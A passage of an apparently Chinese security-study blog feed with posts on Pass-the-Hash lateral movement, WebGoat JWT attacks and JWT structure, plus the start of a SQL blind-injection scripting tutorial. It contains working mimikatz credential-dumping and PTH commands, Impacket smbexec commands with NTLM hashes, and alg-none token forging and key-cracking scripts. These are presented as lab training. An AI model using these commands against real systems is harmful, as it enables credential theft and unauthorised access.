@&#123;TrustedHosts=&quot;192.168.111.137&quot;&#125;</span><br><span class="line">Set-Item WSMan:localhost\client\trustedhosts -value *</span><br><span class="line">#通过PowerShell</span><br></pre></td></tr></table></figure><h2 id="哈希传递攻击"><a href="#哈希传递攻击" class="headerlink" title="哈希传递攻击"></a>哈希传递攻击</h2><p>哈希传递（<strong>Pass The Hash,PTH</strong>）是一种针对<strong>NTLM</strong>协议的攻击技术。在NTLM身份认证的第三步中生成<strong>Response</strong>时，客户端直接使用用户的<strong>NTLM</strong>哈希值进行计算，用户的明文密码并不参与整个认证过程。也就是说，在<strong>Windows</strong>系统中只使用用户哈希值对访问资源的用户进行身份认证。关于<strong>NTLM</strong>协议与<strong>NTLM</strong>协议的认证流程，请读者阅读后面的<strong>NTLM Relay</strong>专题。<br>因此，当测试人员获得有效的用户名和密码哈希值后，就能够使用该信息对远程主机进行身份认证，不需暴力破解获取明文密码即可获取该主机权限。该方法直接取代了窃取用户明文密码和暴力破解哈希值的需要，在内网渗透中十分经典在域环境中，用户登录计算机时一般使用域账号，并且大多数计算机在安装时可能会使用相同的本地管理员账号和密码。因此，在域环境进行哈希传递往往可以批量获取内网主机权限。</p><h3 id="1-利用mimikatz进行PTH"><a href="#1-利用mimikatz进行PTH" class="headerlink" title="1.利用mimikatz进行PTH"></a>1.利用mimikatz进行PTH</h3><p><strong>mimikatz</strong>中内设了哈希传递功能，<strong>需要本地管理员权限</strong></p><ol><li><p>将<strong>mimikatz</strong>上传到跳板机并执行以下命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; exit</span><br></pre></td></tr></table></figure><p>抓取用户<strong>hash</strong></p><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231224115352296.png" class title="image-20231224115352296"></li><li><p>利用mimikatz,使用抓取到的NTLM哈希进行PTH攻击</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1. mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::pth /user:Administrator /domain:test.local /ntlm:161cff084477fe596a5db81874498a24&quot; exit</span><br></pre></td></tr></table></figure><img src="/2024/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/01/23/%E5%86%85%E7%BD%91%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/image-20231224122033021.png" class title="image-20231224122033021"></li></ol><h3 id="2-利用Impacket进行PTH"><a href="#2-利用Impacket进行PTH" class="headerlink" title="2.利用Impacket进行PTH"></a>2.利用Impacket进行PTH</h3><p><strong>Impacket</strong>项目中具有远程执行功能的几个脚本几乎都可以进行哈希传递攻击，常见的有<strong>psexec.py</strong>、<strong>smbexec.py</strong>和<strong>wmiexec.py</strong>。在使用时，可以借助内网代理等技术对内网主机进行攻击。以<strong>smbexec.py</strong>为例，执行以下命令，通过进行哈希传递，获取远程主机<br>（10.10.10.19）的交互式命令行，如图5-9-3所示。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python smbexec.py -hashes :570a9a65db8fba761c1008a51d4c95ab hack-my.com/ administrator@10.10.10.19</span><br><span class="line"># python smbexec.py -hashes LM Hash:NLTM Hash domain/username@ip</span><br><span class="line"># -hashes，指定用户完整的哈希值，如果LM Hash被废弃，就将其指定为O或为空</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python smbexec.py -hashes  :161cff084477fe596a5db81874498a24 test.local/Administrator@192.168.111.137</span><br><span class="line">#python smbexec.py -hashes LM HASH:NTLM HASH &lt;domain&gt;/&lt;username&gt;@&lt;IP&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">173dc846546fb0e838c0fd2ac2908c1f</span><br><span class="line">python smbexec.py -hashes :173dc846546fb0e838c0fd2ac2908c1f test.local/bob@192.168.111.136</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 内网渗透体系建设 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JWT的攻击方法</title>
      <link href="/2024/01/22/JWT%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/"/>
      <url>/2024/01/22/JWT%E7%9A%84%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="JWT的攻击方法"><a href="#JWT的攻击方法" class="headerlink" title="JWT的攻击方法"></a>JWT的攻击方法</h1><h3 id="webgoat靶场搭建"><a href="#webgoat靶场搭建" class="headerlink" title="webgoat靶场搭建"></a>webgoat靶场搭建</h3><p>我用的是docker搭建，这样快一点，也可以在GitHub上下载了直接拖到kali里，但是很慢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker pull webgoat/webgoat-8.0    拉取docker</span><br><span class="line">docker images     查看容器是否下载成功</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230620104650145.png"><br>运行靶场</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run -p 8080:8080 -t webgoat/webgoat-8.0 </span><br></pre></td></tr></table></figure><p>之后通过浏览器访问 <code>http://127.0.0.1:8080/WebGoat</code> 就可以了</p><p>在宿主机上也能访问<code>http://192.168.144.128:8080/WebGoat</code>，方便抓包</p><p>github官方连接，也可以直接下载拖到kali上<a href="https://github.com/WebGoat/WebGoat/releases">Releases · WebGoat&#x2F;WebGoat (github.com)</a></p><p><img src="http://pic.bamboo22.top/image-20230620104946666.png"></p><p><img src="http://pic.bamboo22.top/image-20230620105023348.png"></p><p>第一次进去要注册，之后登录就可以用了</p><h3 id="空加密验证攻击"><a href="#空加密验证攻击" class="headerlink" title="空加密验证攻击"></a>空加密验证攻击</h3><p><img src="http://pic.bamboo22.top/image-20230620111115257.png"></p><p>打开JWT tokens的第4部分</p><p>点击vote now 弹窗提示我们游客不能投票，需要登录</p><p>这关的要求是切换到管理员身份就能重置投票</p><p><img src="http://pic.bamboo22.top/image-20230620111411253.png"></p><p>点击切换到Tom并抓包</p><p><img src="http://pic.bamboo22.top/image-20230620121908728.png"></p><p>抓包后能看到token值 （这里记得多抓几次，有些时候看不到）</p><p><img src="http://pic.bamboo22.top/image-20230620122439982.png"></p><p>然后将这个值拿到解析网站去解析<a href="https://jwt.io/">JSON Web Tokens - jwt.io</a></p><p><img src="http://pic.bamboo22.top/image-20230620122556951.png"></p><p>可以看出，这里采用了hs512算法进行加密验证，然后用户名是Tom。 那么，接下来我们尝试一下利用空加密进行绕过！！！</p><p>具体的exp代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">b64urlencode</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(data).replace(<span class="string">b&#x27;+&#x27;</span>, <span class="string">b&#x27;-&#x27;</span>).replace(<span class="string">b&#x27;/&#x27;</span>, <span class="string">b&#x27;_&#x27;</span>).replace(<span class="string">b&#x27;=&#x27;</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(b64urlencode(<span class="string">b&#x27;&#123;&quot;alg&quot;:&quot;none&quot;&#125;&#x27;</span>)+<span class="string">b&#x27;.&#x27;</span>+b64urlencode(<span class="string">b&#x27;&#123;&quot;iat&quot;:1573470025,&quot;admin&quot;:&quot;true&quot;,&quot;user&quot;:&quot;Jerry&quot;&#125;&#x27;</span>)+<span class="string">b&#x27;.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">执行结果：</span><br><span class="line">eyJhbGciOiJub25lIn0.eyJpYXQiOjE1NzM0NzAwMjUsImFkbWluIjoidHJ1ZSIsInVzZXIiOiJKZXJyeSJ9.</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230620122856301.png"></p><p>看到这里，我们将admin对应的值更改为了true ， 也就是说此时，我们设置了Jerry这个用户为admin。 然后由于还设置了alg为空密码，因此，可以绕过签名密钥未知的情况！！！ 那么，我们把之前抓到的包放出去看看：</p><p><img src="http://pic.bamboo22.top/image-20230620123037686.png"></p><p>可以看到已经重置投票了</p><p><img src="http://pic.bamboo22.top/image-20230620123359767.png"></p><h3 id="字典爆破"><a href="#字典爆破" class="headerlink" title="字典爆破"></a>字典爆破</h3><p>对 JWT 的密钥爆破需要在一定的前提下进行：</p><ul><li>知悉JWT使用的加密算法</li><li>一段有效的、已签名的token</li><li>签名用的密钥不复杂（弱密钥）</li></ul><p>进入下一关，看到题目描述是去找到秘钥，提交一个新的key，将username改为WebGoat</p><p><img src="http://pic.bamboo22.top/image-20230620154547838.png"></p><p>先把token丢到加密网站看看是什么内容</p><p><img src="http://pic.bamboo22.top/image-20230620154943362.png"></p><p>接下来我们需要爆破私钥</p><p>我使用的是JWT_tool爆破</p><p><a href="http://t.csdn.cn/y9B86">JWT攻击手册(附jwt_tool用法,爆破弱密钥等)</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 jwt_tool.py JWT_HERE -C -d dictionary.txt     用dictionary.txt作为字典爆破</span><br></pre></td></tr></table></figure><p><img src="http://pic.bamboo22.top/image-20230620172719645.png"></p><p>得到key的值是<code>available</code></p><p>在这里我找字典找了很久，最后在这里找到<a href="https://github.com/TheKingOfDuck/fuzzDicts">TheKingOfDuck&#x2F;fuzzDicts: Web Pentesting Fuzz (github.com)</a></p><p>也可以跑python脚本，网上找到的python脚本，但是我跑的时候一直报错，还没解决</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"><span class="keyword">import</span> termcolor</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    jwt_str = <span class="string">R&#x27;eyJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJXZWJHb2F0IFRva2VuIEJ1aWxkZXIiLCJhdWQiOiJ3ZWJnb2F0Lm9yZyIsImlhdCI6MTY3MDc2NTAzOCwiZXhwIjoxNjcwNzY1MDk4LCJzdWIiOiJ0b21Ad2ViZ29hdC5vcmciLCJ1c2VybmFtZSI6IlRvbSIsIkVtYWlsIjoidG9tQHdlYmdvYXQub3JnIiwiUm9sZSI6WyJNYW5hZ2VyIiwiUHJvamVjdCBBZG1pbmlzdHJhdG9yIl19.aIR7sjd5o7XJgUkYPCw76e9iF838G-Hh9J-sN1M-J94&#x27;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;top1000.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            key_ = line.strip()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                jwt.decode(jwt_str, verify=<span class="literal">True</span>, key=key_)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\bbingo! found key --&gt;&#x27;</span>, termcolor.colored(key_, <span class="string">&#x27;green&#x27;</span>), <span class="string">&#x27;&lt;--&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> (jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\bbingo! found key --&gt;&#x27;</span>, termcolor.colored(key_, <span class="string">&#x27;green&#x27;</span>), <span class="string">&#x27;&lt;--&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> jwt.exceptions.InvalidSignatureError:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27; &#x27;</span> * <span class="number">64</span>, <span class="string">&#x27;\r\btry&#x27;</span>, key_, end=<span class="string">&#x27;&#x27;</span>, flush=<span class="literal">True</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\bsorry! no key be found.&#x27;</span>)</span><br></pre></td></tr></table></figure><p>得到key后修改内容</p><p><img src="http://pic.bamboo22.top/image-20230620173102617.png"></p><p>这道题还设置了时间戳，将exp中的时间即过期时间，将其设置为一个当前时间之后的数</p><p><img src="http://pic.bamboo22.top/image-20230620173338087.png"></p><p>成功</p><p><img src="http://pic.bamboo22.top/image-20230620173318200.png"></p><h3 id="认证-键值逻辑"><a href="#认证-键值逻辑" class="headerlink" title="认证-键值逻辑"></a>认证-键值逻辑</h3><p><img src="http://pic.bamboo22.top/image-20230621164429911.png"></p><p>这一关应该是一个真实案例，一个应用键值逻辑来绕过的例子</p><p><img src="http://pic.bamboo22.top/image-20230621164902180.png"></p><p>下面这个问题描述，大概意思就是你要重置密码，但是用的是无法识别的设备或地址，需要回答验证问题，但是你忘了你设置的答案</p><p>看一下源码：</p><p><img src="http://pic.bamboo22.top/8249cc0956ef4a23802d72759dd50b5f.png"></p><p>这里可以看出来，一共有两个问题并且有相应的答案。 那么试想一下，如果我们查询secQuestion2， 则由于数据库里无secQuestion2的字段，那么当我们查询的时候则对应的secQuestion2的值就为none，或者其他的什么    因此，我们可以尝试一下设置：</p><p><img src="http://pic.bamboo22.top/fcaa473f9cc643c8b8478723642cd262.png"><br>将两个问题都改为none</p><p><img src="http://pic.bamboo22.top/image-20230621170933205.png"></p>]]></content>
      
      
      <categories>
          
          <category> web基础漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>JWT</title>
      <link href="/2024/01/22/JWT/"/>
      <url>/2024/01/22/JWT/</url>
      
        <content type="html"><![CDATA[<h1 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h1><h2 id="什么是JWT"><a href="#什么是JWT" class="headerlink" title="什么是JWT"></a>什么是JWT</h2><h3 id="JWT介绍"><a href="#JWT介绍" class="headerlink" title="JWT介绍"></a>JWT介绍</h3><blockquote><p>JSON Web Token（JSON Web令牌）</p></blockquote><p><img src="http://pic.bamboo22.top/120.png"></p><p>**JWT(json web token)**是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准。 JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源。比如用户登录。在传统的用户登录认证中，因为http是无状态的，所以都是采用session方式。用户登录成功，服务端会保存一个session，服务端会返回给客户端一个sessionId，客户端会把sessionId保存在cookie中，每次请求都会携带这个sessionId。 </p><p><strong>cookie+session</strong>这种模式通常是保存在内存中，而且服务从单服务到多服务会面临的session共享问题。虽然目前存在使用Redis进行Session共享的机制，但是随着用户量和访问量的增加，Redis中保存的数据会越来越多，开销就会越来越大，多服务间的耦合性也会越来越大，Redis中的数据也很难进行管理，例如当Redis集群服务器出现Down机的情况下，整个业务系统随之将变为不可用的状态。而JWT不是这样的，只需要服务端生成token，客户端保存这个token，每次请求携带这个token，服务端认证解析就可。</p><h3 id="JWT作用："><a href="#JWT作用：" class="headerlink" title="JWT作用："></a>JWT作用：</h3><ul><li>授权：一旦用户登录，每个后续请求将包括JWT，从而允许用户访问该令牌允许的路由，服务和资源。它的开销很小并且可以在不同的域中使用。如：单点登录。</li><li>信息交换：在各方之间安全地传输信息。JWT可进行签名（如使用公钥&#x2F;私钥对)，因此可确保发件人。由于签名是使用标头和有效负载计算的，因此还可验证内容是否被篡改。</li></ul><h3 id="JWT结构解析"><a href="#JWT结构解析" class="headerlink" title="JWT结构解析"></a>JWT结构解析</h3><h4 id="header"><a href="#header" class="headerlink" title="header"></a>header</h4><p>jwt的头部承载两部分信息： </p><ol><li><p>声明类型，这里是jwt </p></li><li><p>声明加密的算法 通常直接使用 HMAC SHA256</p><p>完整的头部就像下面这样的JSON：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span> </span><br><span class="line">    </span><br><span class="line"><span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span> <span class="string">&quot;JWT&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;HS256&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>然后将头部进行base64加密（该加密是可以对称解密的),构成了第一部分：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</span><br></pre></td></tr></table></figure></li></ol><h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><p>载荷就是存放有效信息的地方。这个名字像是特指飞机上承载的货品，这些有效信息包含三个部分：标准中注册的声明、公共的声明、私有的声明。</p><ol><li><p>标准中注册的声明 (建议但不强制使用) ：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">iss<span class="punctuation">:</span> jwt签发者</span><br><span class="line">sub<span class="punctuation">:</span> jwt所面向的用户 </span><br><span class="line">aud<span class="punctuation">:</span> 接收jwt的一方 </span><br><span class="line">exp<span class="punctuation">:</span> jwt的过期时间，这个过期时间必须要大于签发时间</span><br><span class="line">nbf<span class="punctuation">:</span> 定义在什么时间之前，该jwt都是不可用的.</span><br><span class="line">iat<span class="punctuation">:</span> jwt的签发时间</span><br><span class="line">jti<span class="punctuation">:</span> jwt的唯一身份标识，主要用来作为一次性token<span class="punctuation">,</span>从而回避重放攻击。</span><br></pre></td></tr></table></figure></li><li><p>公共的声明 ： 公共的声明可以添加任何的信息，一般添加用户的相关信息或其他业务需要的必要信息.但不建议添加敏感信息，因为该部分在客户端可解密。</p></li><li><p>私有的声明 ： 私有声明是提供者和消费者所共同定义的声明，一般不建议存放敏感信息，因为base64是对称解密的，意味着该部分信息可以归类为明文信息。</p><p>定义一个payload：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span> </span><br><span class="line">   </span><br><span class="line"><span class="attr">&quot;uid&quot;</span><span class="punctuation">:</span><span class="string">&quot;e12a34b56c78d9e0f&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;ramostear&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;role&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>然后将其进行base64加密，得到Jwt的第二部分：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJvcmciOiLku4rml6XlpLTmnaEiLCJuYW1lIjoiRnJlZeeggeWGnCIsImV4cCI6MTUxNDM1NjEwMywiaWF0IjoxNTE0MzU2MDQzLCJhZ2UiOiIyOCJ9</span><br></pre></td></tr></table></figure></li></ol><h4 id="signature"><a href="#signature" class="headerlink" title="signature"></a>signature</h4><p> jwt的第三部分是一个签证信息，这个签证信息由三部分组成：header (base64后的)、 payload (base64后的)、secret。 这个部分需要base64加密后的header和base64加密后的payload使用。连接组成的字符串，然后通过header中声明的加密方式进行加盐secret组合加密，然后就构成了jwt的第三部分：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">base64UrlEncode(header) + <span class="string">&quot;.&quot;</span> +</span><br><span class="line">base64UrlEncode(payload)<span class="punctuation">,</span></span><br><span class="line">secret)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">49UF72vSkj-sA4aHHiYN5eoZ9Nb4w5Vb45PsLF7x_NY</span><br></pre></td></tr></table></figure><p>密钥secret是保存在服务端的，服务端会根据这个密钥进行生成token和验证，所以需要保护好。</p><p>下图为一个JWT生成流程示例：</p><p><img src="http://pic.bamboo22.top/image-20230619102906786.png"></p><h3 id="JWT认证流程"><a href="#JWT认证流程" class="headerlink" title="JWT认证流程"></a>JWT认证流程</h3><p>在身份验证中，当用户成功登录系统时，授权服务器将会把 JSON Web Token 返回给客户端，用户需要将此凭证信息存储在本地(cookie或浏览器缓存)。当用户发起新的请求时，需要在请求头中附带此凭证信息，当服务器接收到用户请求时，会先检查请求头中有无凭证，是否过期，是否有效。如果凭证有效，将放行请求；若凭证非法或者过期，服务器将回跳到认证中心，重新对用户身份进行验证，直至用户身份验证成功。以访问 API 资源为例，下图显示了获取并使用 JWT 的基本流程：</p><p><img src="http://pic.bamboo22.top/1200-16871417935843.png"></p><ol><li>用户使用账号和密码登录，调用后端登录接口；</li><li>后端登录程序生成jwt(注意这里小写指的是具体的token)，这一步通常是由jwt插件完成的，我们只需要配置jwt加密密钥、token刷新时间、token有效时间；</li><li>后端返回jwt给前端；</li><li>前端之后的请求直接带上token即可，只要在token的有效期内；</li><li>后端收到前端的请求，会验证token的合法性、有效性，验证通过之后处理请求；</li><li>后端发送响应给前端。</li></ol><h3 id="JWT的利弊"><a href="#JWT的利弊" class="headerlink" title="JWT的利弊"></a>JWT的利弊</h3><p>1、 使用 JWT 的优势 使用 JSON Web Token 保护应用安全，你至少可以获得以下几个优势：</p><ul><li>更少的<a href="https://cloud.tencent.com/solution/database?from=20065&from_column=20065">数据库</a>连接：因其基于算法来实现身份认证，在使用 JWT 时查询数据的次数更少(更少的数据连接不等于不连接数据库)，可以获得更快的系统响应时间。构建更简单：如果你的应用程序本身是无状态的，那么选择 JWT 可以加快系统构建过程。 </li><li>跨服务调用：你可以构建一个认证中心来处理用户身份认证和发放签名的工作，其他应用服务在后续的用户请求中不需要(理论上)在询问认证中心，可使用自有的公钥对用户签名进行验证。 </li><li>无状态：你不需要向传统的 Web 应用那样将用户状态保存于 Session 中。</li></ul><p>2、使用 JWT 的弊端</p><ul><li>严重依赖于秘钥：JWT 的生成与解析过程都需要依赖于秘钥(Secret)，且都以硬编码的方式存在于系统中(也有放在外部配置文件中的)。如果秘钥不小心泄露，系统的安全性将收到威胁。 </li><li>服务端无法管理客户端的信息：如果用户身份发生异常(信息泄露，或者被攻击)，服务端很难向操作 Session 那样主动将异常用户进行隔离。 </li><li>服务端无法主动推送消息：服务端由于是无状态的，他将无法使用像 Session 那样的方式推送消息到客户端，例如过期时间将至，服务端无法主动为用户续约，需要客户端向服务端发起续约请求。 </li><li>冗余的数据开销：一个 JWT 签名的大小要远比一个 Session ID 长很多，如果你对有效载荷(payload)中的数据不做有效控制，其长度会成几何倍数增长，且在每一次请求时都需要负担额外的网络开销。 </li><li>JSON Web Token 很流行，但是它相比于 Session,OIDC(OpenId Connect)等技术还比较新，支持 JSON Web Token 的库还比较少，而且 JWT 也并非比传统 Session 更安全，他们都没有解决 CSRF 和 XSS 的问题。因此，在决定使用 JWT 前，你需要仔细考虑其利弊。</li></ul>]]></content>
      
      
      <categories>
          
          <category> web基础漏洞 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>SQL盲注脚本编写</title>
      <link href="/2024/01/22/SQL%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/"/>
      <url>/2024/01/22/SQL%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC%E7%BC%96%E5%86%99/</url>
      
        <content type="html"><![CDATA[<h1 id="SQL盲注脚本编写"><a href="#SQL盲注脚本编写" class="headerlink" title="SQL盲注脚本编写"></a>SQL盲注脚本编写</h1><h2 id="Python-requests-模块"><a href="#Python-requests-模块" class="headerlink" title="Python requests 模块"></a>Python requests 模块</h2><p>Python requests 是一个常用的 HTTP 请求库，可以方便地向网站发送 HTTP 请求，并获取响应结果。</p><p>requests 模块比 <a href="https://www.runoob.com/python3/python-urllib.html">urllib</a> 模块更简洁。</p><p>使用 requests 发送 HTTP 请求需要先导入 requests 模块：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br></pre></td></tr></table></figure><p>导入后就可以发送 HTTP 请求，使用 requests 提供的方法向指定 URL 发送 HTTP 请求，例如：</p><p><strong>实例:</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">\<span class="comment"># 导入 requests 包</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">\<span class="comment"># 发送请求</span></span><br><span class="line">x = requests.get(<span class="string">&#x27;https://www.runoob.com/&#x27;</span>)</span><br><span class="line"></span><br><span class="line">\<span class="comment"># 返回网页内容</span></span><br><span class="line"><span class="built_in">print</span>(x.text)</span><br></pre></td></tr></table></figure><p>每次调用 requests 请求之后，会返回一个 response 对象，该对象包含了具体的响应信息，如状态码、响应头、响应内容等：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(response.status_code)  <span class="comment"># 获取响应状态码</span></span><br><span class="line"><span class="built_in">print</span>(response.headers)  <span class="comment"># 获取响应头</span></span><br><span class="line"><span class="built_in">print</span>(response.content)  <span class="comment"># 获取响应内容</span></span><br></pre></td></tr></table></figure><p><strong>更多响应信息如下：</strong></p><table><thead><tr><th align="left">属性或方法</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left">apparent_encoding</td><td align="left">编码方式</td></tr><tr><td align="left">close()</td><td align="left">关闭与服务器的连接</td></tr><tr><td align="left">content</td><td align="left">返回响应的内容，以字节为单位</td></tr><tr><td align="left">cookies</td><td align="left">返回一个 CookieJar 对象，包含了从服务器发回的 cookie</td></tr><tr><td align="left">elapsed</td><td align="left">返回一个 timedelta 对象，包含了从发送请求到响应到达之间经过的时间量，可以用于测试响应速度。比如 r.elapsed.microseconds 表示响应到达需要多少微秒。</td></tr><tr><td align="left">encoding</td><td align="left">解码 r.text 的编码方式</td></tr><tr><td align="left">headers</td><td align="left">返回响应头，字典格式</td></tr><tr><td align="left">history</td><td align="left">返回包含请求历史的响应对象列表（url）</td></tr><tr><td align="left">is_permanent_redirect</td><td align="left">如果响应是永久重定向的 url，则返回 True，否则返回 False</td></tr><tr><td align="left">is_redirect</td><td align="left">如果响应被重定向，则返回 True，否则返回 False</td></tr><tr><td align="left">iter_content()</td><td align="left">迭代响应</td></tr><tr><td align="left">iter_lines()</td><td align="left">迭代响应的行</td></tr><tr><td align="left">json()</td><td align="left">返回结果的 JSON 对象 (结果需要以 JSON 格式编写的，否则会引发错误)</td></tr><tr><td align="left">links</td><td align="left">返回响应的解析头链接</td></tr><tr><td align="left">next</td><td align="left">返回重定向链中下一个请求的 PreparedRequest 对象</td></tr><tr><td align="left">ok</td><td align="left">检查 “status_code” 的值，如果小于400，则返回 